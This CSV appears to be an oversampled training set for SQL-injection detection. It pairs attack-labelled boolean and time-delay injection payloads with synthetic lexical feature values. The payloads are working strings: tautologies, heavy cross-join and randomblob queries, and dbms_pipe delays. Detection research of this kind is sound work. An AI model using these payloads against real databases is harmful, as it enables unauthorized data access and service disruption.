id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000117,attack,boolean,"1""  )   where 3393  =  3393 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000016,0.07843674275540662,142.07040543348148,31.976531522172838,4.147399995107128,69.07040543348148,15.90612608869135,41.04693695565433,16.046936955654324,0.4861600493264251,0.11198817175763551,0.28891218238152705,0.11293959653441236,0.0,1.0352027167407432,1.9765315221728375,0.0,1.0,2.0,0.0,5.011734238913581,0.023468477827162604,0.0,2.0,4.976531522172838,0.0,1.0,0.988265761086419,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.9882657610864186,1.0,0.023468477827162437,0.9882657610864187,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000118,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000008,1.243251886468956,214.42166206355887,34.77035339586542,3.7798108646057957,65.39977084418317,25.925883489663548,85.24424075038503,37.851766979327095,0.3027775760152481,0.1218772090470173,0.3982802196284324,0.17706499530930223,4.0,0.0,0.0,0.0,0.0,2.0,0.0,18.311060187596258,1.22964660413458,1.3851766979327098,3.3851766979327103,9.54070679173084,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.77035339586542,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.77035339586542
SMOTE_000119,attack,boolean,"1'  )   and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000022,2.262973610286308,117.79276850817436,30.76956286713036,3.787058836294605,45.53480846156602,12.128980023304177,43.94927144521727,16.17970857808691,0.37825654253070345,0.10587006870619053,0.3770227278081662,0.13885066095493978,1.7695628671303618,0.0,2.0,0.5898542890434539,0.41014571095654606,1.0,0.0,7.769562867130362,0.0,0.0,1.410145710956546,4.0,0.5898542890434539,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.410145710956546,0.0,0.0,0.4101457109565461,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.8202914219130921
SMOTE_000120,attack,boolean,"1%'   )    )    or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   '%'  =  '",nearest_attack_euclidean,R000020,0.6023033177466259,205.40695826201585,29.088778440285463,3.5026691530239815,107.80397614972334,11.64488623885815,63.224431194290744,22.73366467914361,0.524352075077106,0.0566218617027949,0.30770150810056096,0.11132455511953815,3.644886238858149,0.3551137611418511,0.0,0.0,1.0,2.0,0.0,7.822443119429075,2.0,0.0,5.644886238858149,3.0,0.9112215597145372,0.08877844028546289,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0887784402854628,0.9112215597145371,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000121,attack,boolean,"1%' or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and '%'  =  '",nearest_attack_euclidean,R000002,2.1600176657717447,152.06552800302632,33.0,3.7120419088759466,42.97025134961139,19.892864372515298,62.6785931175459,26.523819163353735,0.28458976278058346,0.1301621915514671,0.41169845693265994,0.17354958873528947,5.184522604580783,0.0,0.0,0.5922613022903916,0.0,2.0,0.0,12.077386977096083,2.0,0.40773869770960836,1.8154773954192167,5.038693488548041,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.40773869770960836,0.0,0.0,0.0,0.0,1.4077386977096085,0.5922613022903916,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0386934885480414,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.038693488548041
SMOTE_000122,attack,boolean,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and    (    (   'cgou' like 'cgou",nearest_attack_euclidean,R000014,0.042849152059366985,154.84101182646245,33.969425351242776,3.928850617324533,63.01222985950289,9.98777014049711,56.902161123976896,24.938850702485556,0.4070473559967899,0.06450083788509266,0.3674367241864495,0.1610150819316679,2.981655210745667,0.0,0.012229859502888463,0.0,0.006114929751444287,0.006114929751444453,0.0,11.963310421491334,0.0,1.9877701404971115,1.0061149297514442,5.987770140497112,0.9938850702485558,0.0,0.006114929751444231,0.0,0.0,0.006114929751444231,1.0,0.0,0.0,0.0,0.993885070248556,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000123,attack,boolean,"1'  )   and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000022,2.3642282906729273,82.74721901646609,24.808293907123,3.2728580492227715,21.023185437187735,12.728934918038842,36.15871797816831,12.836380683071209,0.21067927979993678,0.17439582673140694,0.45911169924427603,0.15581319422438022,2.2429783060129473,0.0,1.2429783060129473,0.6214891530064738,0.0,1.0,0.0,6.728934918038842,0.37851084699352633,0.0,0.6214891530064737,2.864467459019421,1.0,0.0,0.6214891530064737,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000124,attack,boolean,"1%' or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and '%'  =  '",nearest_attack_euclidean,R000002,1.052620958889928,134.02923229410368,33.23651711519589,3.739713597375505,38.96685941911357,17.12865403676296,54.62247922548475,23.311239612742376,0.2906945531604379,0.12791634051868633,0.4083311590134645,0.17305794730741125,5.526965769608232,0.0,0.0,0.7634828848041159,0.0,2.0,0.0,9.892136921567072,2.0,0.23651711519588414,1.4730342303917683,4.18258557597942,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.23651711519588428,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.1825855759794208,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.1825855759794206
SMOTE_000125,attack,boolean,"1%'   )    )    or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   '%'  =  '",nearest_attack_euclidean,R000020,0.07229670132086093,210.03000645128455,29.0,3.4659225686071675,110.45585727754987,11.952683241526076,64.71609944915646,22.905366483052152,0.525803856477844,0.05693288094884409,0.30817247380280377,0.10909078877050807,3.952683241526075,0.0,0.023658379236962457,0.0,1.0,1.988170810381519,0.0,7.976341620763038,1.9763416207630378,0.0,5.952683241526076,3.011829189618481,0.9881708103815188,0.0,0.011829189618481062,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.9881708103815188,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.9881708103815194
SMOTE_000126,attack,boolean,1%'   )    )     )   and 1661  =  7683,nearest_attack_euclidean,R000003,1.3944627992314522,54.074162299413004,17.241792829011764,2.8403226884697186,9.474315370596898,10.339513524951084,25.80455860812136,8.455774795743654,0.12626830076182854,0.21441006058694356,0.5021746366316631,0.15714700201956477,1.4465045083170278,0.0,0.4465045083170278,0.2232522541585139,0.0,1.0,0.0,4.339513524951084,0.776747745841486,0.0,0.2232522541585138,1.6697567624755418,1.0,0.0,0.2232522541585139,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000127,attack,boolean,"-8673""  )   or make_set  (  9354  =  9354,7185  )   and   (  ""edap"" like ""edap",nearest_attack_euclidean,R000021,1.4912807343162002,70.59497850940754,26.967249002582463,3.863463539732517,21.67685600295139,13.967249002582463,23.82205250276693,11.12882100110677,0.30603764672574885,0.18609960401277845,0.3440886296159658,0.1637741196455069,0.0,3.564410500553385,0.8548035001844616,0.2903929996310767,0.1451964998155383,0.8548035001844617,0.0,3.7096070003689245,0.0,0.8548035001844616,0.8548035001844618,2.1451964998155377,0.0,1.0,0.0,0.0,0.14519649981553823,0.8548035001844617,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.8548035001844616,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.8548035001844618
SMOTE_000128,attack,boolean,""" or isNULL  (  1/0  )   /*",nearest_attack_euclidean,R000001,0.18074711942826988,28.481790676332366,15.303499295152415,3.2060289928605075,8.42846959315635,2.232087696293025,11.62485149001968,6.1963818968633255,0.2962001190587752,0.0751861233829114,0.4075997618824495,0.2210139956758638,0.05355869914454381,0.9821471002851521,0.03570579942969587,1.982147100285152,0.9821471002851522,0.017852899714847936,0.0,2.1249702980039356,0.0,0.0,0.017852899714847936,3.017852899714848,0.01785289971484788,0.9821471002851521,0.017852899714847936,0.0,0.9821471002851521,0.017852899714847936,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.017852899714848047,0.9821471002851521,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000129,attack,boolean,"1 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000025,2.253694056597146,273.69945012619337,37.62702664451612,3.768557438989365,87.29405045845155,29.603242631225797,111.89729308967735,44.904863946838695,0.3163407207119915,0.10982994360774531,0.40718594870741287,0.16664338697285033,1.301621315612898,0.0,1.349189342193551,0.0,0.0,1.0,0.0,25.254053289032242,0.0,2.0,4.0,12.34918934219355,0.3254053289032245,0.0,0.6745946710967755,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.32540532890322443,0.0,0.0,0.3254053289032245,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0,0.0,0.0,0.0,0.0,0.0,0.0,0.32540532890322443,0.32540532890322443,9.301621315612898
SMOTE_000130,attack,boolean,"1%'  )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and   (  '%'  =  '",nearest_attack_euclidean,R000026,2.5413639202488736,217.33236363428477,34.38700293235014,3.718700070716604,63.39734897253408,27.0,88.6233431078338,38.3116715539169,0.29057828044933837,0.12485845189411626,0.40820639353312155,0.17635687412342382,2.1506627568664785,0.0,0.9246686215667606,0.0,0.0,1.5376656892166196,0.0,19.84933724313352,1.0753313784332394,1.4623343107833802,3.4623343107833806,10.311671553916902,0.5376656892166196,0.0,0.46233431078338016,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.5376656892166196,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.92466862156676,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.462334310783381
SMOTE_000131,attack,boolean,-9148  )   where 2027  =  2027 or 8571  =  8571--,nearest_attack_euclidean,R000007,1.612808721114042,51.293136472331696,18.91094706027642,3.576321057225793,9.675325884386993,18.853431763834145,16.764378824110572,6.0,0.185543233034746,0.37029885973329835,0.3268142407510614,0.11734366648089416,0.0,0.38218941205528434,2.6178105879447156,0.0,0.0,2.0,0.0,1.0,0.0,0.0,-2.220446049250313e-16,4.6178105879447156,0.0,0.38218941205528434,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.38218941205528445,0.6178105879447157,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000132,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000008,0.8492592419775904,213.08681513563377,35.20434075678169,3.7696353996011407,62.62749145961737,26.00723459463615,85.63472605425352,38.81736302712675,0.29348762358232555,0.1227616024974187,0.4019116736564405,0.18183910026381522,4.0,0.0,0.0,0.0,0.0,2.0,0.0,18.40868151356338,2.0,1.4014469189272298,3.4014469189272294,9.60578767570892,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.802893837854459,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.80289383785446
SMOTE_000133,attack,boolean,"-2583""  )   where 3455  =  3455 or make_set  (  9354  =  9354,7185  )  --",nearest_attack_euclidean,R000019,0.5834644899825863,80.37234987923316,26.641073902542015,3.813569835959024,19.87651077330178,23.145234796610648,25.81637605720237,11.534228252118345,0.22320783215722229,0.30567873268869206,0.32448958663652105,0.14662384851756458,0.0,1.0,2.8931543495763314,0.0,0.10684565042366898,2.0,0.0,3.213691300847337,0.0,0.893154349576331,1.106845650423669,5.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.10684565042366889,0.0,1.0,0.10684565042366889,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.213691300847338
SMOTE_000134,attack,boolean,1'   )    )    and 2832  =  4165--,nearest_attack_euclidean,R000010,2.2742835490030378,59.424418888435724,16.84904864643169,2.8865789993884388,3.9245243232158487,15.933932424118833,30.792389171453515,8.773572969647532,0.07341724068870839,0.2669973339141173,0.5023630302757593,0.157222395121415,0.5377378383920777,0.0,1.537737838392078,0.0,0.4622621616079223,1.462262161607922,0.0,4.7735729696475335,0.0,0.0,-2.220446049250313e-16,3.462262161607922,0.5377378383920777,0.0,0.5377378383920778,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.4622621616079223,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.4622621616079226
SMOTE_000135,attack,boolean,-9148  )   where 2027  =  2027 or 8571  =  8571--,nearest_attack_euclidean,R000007,0.2887613683791069,51.006919322922144,17.7525947460958,3.5108152579166725,7.585351469185618,20.334486553820355,16.66897310764071,6.41810819227544,0.1469482210594466,0.40152402982352664,0.32671763296271755,0.12481011615430918,0.0,0.08362163845508869,3.0,0.0,0.0,2.0,0.0,1.1672432769101793,0.0,0.08362163845508874,0.08362163845508874,5.0,0.0,0.08362163845508874,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000136,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000008,0.7782782634937959,191.76937776252177,33.37059596306323,3.730496595240585,62.04932521369179,22.489430311351757,74.61531111873911,32.615311118739115,0.32059496698636003,0.11815836060445245,0.39027611252764705,0.17097055988154045,4.0,0.0,0.0,0.0,0.12588080738735347,2.0,0.0,14.992953540901173,2.0,0.8741191926126466,3.37764242216206,7.3705959630632325,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.8741191926126466,0.12588080738735352,0.0,0.0,0.1258808073873534,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.3705959630632325,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.622357577837939
SMOTE_000137,attack,boolean,"1""   )    )    as ogzn where 6849  =  6849 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000009,1.9059893749971786,143.9375959234503,33.12071611681387,4.067737847136309,70.66598466061907,12.12071611681387,45.12071611681387,16.030179029203467,0.4920993173484247,0.08223293159068723,0.31386178717532764,0.11180596388556044,0.0,0.5150895146017338,2.0,0.0,1.0,1.5150895146017338,0.0,6.0,0.0,0.0,2.0,4.515089514601733,0.0,0.5150895146017338,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.5150895146017339,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.515089514601734
SMOTE_000138,attack,boolean,"1 where 5485  =  5485 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000005,1.8777427923321346,256.2766528280815,36.36167358595923,3.8090393110295544,72.48920472277578,43.702427347428056,100.0,40.0850207578777,0.28324344426114406,0.16987821992030325,0.390253257544052,0.1566250782745007,0.0,0.0,2.0,0.0,0.3191632070203833,2.0,0.0,21.36167358595923,0.0,1.6808367929796164,4.319163207020384,12.723347171918466,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.1595816035101917,0.8404183964898082,0.638326414040767,0.0,1.0,0.15958160351019168,0.1595816035101918,0.8404183964898083,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.1595816035101917,0.0,0.0,0.0,5.882928775428658,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.840418396489808
SMOTE_000139,attack,boolean,"1 where 5485  =  5485 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000005,0.6766075039716188,255.46001661514768,36.76999169242617,3.8093823879187716,74.73495430834392,39.415087229525255,100.0,41.3099750772785,0.29270785187320475,0.1540270875832174,0.3914709362332846,0.16179412431029322,0.0,0.0,2.0,0.0,0.11500415378691653,2.0,0.0,21.769991692426167,0.0,1.8849958462130831,4.115004153786916,13.539983384852334,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.05750207689345828,0.9424979231065416,0.23000830757383367,0.0,1.0,0.057502076893458376,0.05750207689345854,0.9424979231065416,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.05750207689345828,0.0,0.0,0.0,6.5974854617457925,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.942497923106542
SMOTE_000140,attack,boolean,"1%' or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and '%'  =  '",nearest_attack_euclidean,R000002,0.3034140378944112,118.36306473928576,33.397560548958346,3.7466778493252186,34.68153236964288,15.454354913095253,48.28397182068453,19.943205635863094,0.29262260326801853,0.13018812837139226,0.4083043944677441,0.16888487389284518,5.829616907589281,0.0,0.11358872827381328,1.0,0.0,2.0,0.0,8.056794364136907,1.886411271726187,0.0,1.0,3.1703830924107197,1.0,0.0,0.05679436413690647,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.05679436413690664,0.0,0.05679436413690658,0.0,0.9432056358630934,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.056794364136907
SMOTE_000141,attack,boolean,"1""  )   as jidc where 6093  =  6093 and 9198  =  9198--",nearest_attack_euclidean,R000023,1.3809786354585234,60.7115245904817,23.738290092755303,3.7844268668350494,16.483271561079007,16.751672843892102,19.986617248863205,7.489962936647402,0.2677432614434968,0.2832741464745633,0.32877774034004786,0.12020485174189205,0.0,1.744981468323701,1.7516728438920997,0.0,0.0,1.7516728438920997,0.0,1.7449814683237008,0.0,0.24832715610790035,0.24832715610790035,3.5033456877841993,0.0,1.0,0.7516728438920997,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.7516728438920997,0.0,1.0,0.24832715610790035,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000142,attack,boolean,-8004%'  )   or   (  2301  =  7504  )  *7504 and   (  '%'  =  ',nearest_attack_euclidean,R000015,1.4512744560013477,70.29336331292116,20.438972052852222,3.130580382878528,5.0,18.244111788591123,33.6102794714778,13.43897205285222,0.07286127758790692,0.2583708274789553,0.47106000248641156,0.19770789244672615,2.8779441057044384,0.0,1.0,0.0,1.0,2.0,0.0,5.1220558942955625,1.4389720528522192,0.0,-2.220446049250313e-16,4.0,0.7194860264261096,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000143,attack,boolean,"1   )    )    and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000017,1.1439288639056202,125.06077031313345,29.621983634768405,3.8832071063565783,58.15818001754755,9.451295147792944,42.03663939128067,15.41465575651227,0.4597219980204341,0.07742994443694308,0.3386352994106227,0.12421275813200007,0.621983634768404,0.0,2.0,0.20732787825613475,0.7926721217438653,1.0,0.0,6.621983634768403,0.0,0.0,1.7926721217438653,4.0,0.2073278782561348,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.7926721217438653,0.0,0.0,0.7926721217438653,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.5853442434877305
SMOTE_000144,attack,boolean,-9148  )   where 2027  =  2027 or 8571  =  8571--,nearest_attack_euclidean,R000007,0.0004590353803813841,48.99877895836333,16.999837194448443,3.4868175000796655,6.999674388896878,19.999104569466432,16.000000000000007,6.0,0.14285269648703727,0.408151587476944,0.3265423389352863,0.12245337710073237,8.140277577917132e-05,0.0,2.9999185972242213,0.0,0.0,1.999918597224221,0.0,1.0000814027757805,0.0,0.0,-2.220446049250313e-16,4.999837194448442,8.140277577894928e-05,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999185972242208,0.0,8.140277577917132e-05,0.9999185972242208,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.9999185972242204
